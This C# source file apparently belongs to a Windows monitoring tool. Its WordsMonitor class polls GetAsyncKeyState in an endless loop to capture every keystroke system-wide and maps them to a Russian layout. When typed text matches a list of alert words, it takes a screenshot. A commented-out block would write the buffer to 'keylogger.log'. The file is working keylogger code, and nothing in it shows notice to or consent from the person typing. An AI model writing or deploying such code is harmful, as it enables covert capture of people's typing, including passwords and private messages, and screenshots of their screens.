using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Alerts
{
    class WordsMonitor
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static string rusKey = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю. ";
        private static string engKey = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./ ";
        private static void Monitor()
        {

            string buf = "";
            string[] words = Methods.InitAlertWords();

             while (true)
            {

                if (buf.Length > 500) buf = "";
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                    if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) continue;
                    if (state != 0)
                    {
                           if (((Keys)i).ToString().Length == 1 && engKey.Contains(((Keys)i).ToString().ToLower()) && ((Keys)i) != Keys.Enter && ((Keys)i) != Keys.Space)
                            {
                                buf += rusKey.Substring(engKey.IndexOf(((Keys)i).ToString().ToLower()), 1);

                            }

                        foreach (string o in words)
                            {
                            if (buf.Contains(o))
                            {
                                Methods.ScreenShot();
                                buf = "";
                            }
                            }
                       /* if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf + "\n");
                            buf = "";
                        }*/
                    }
                }
            }


        }


        public static async void MonitorAsync()
        {
            await Task.Run(() => Monitor());
        }



    }

}

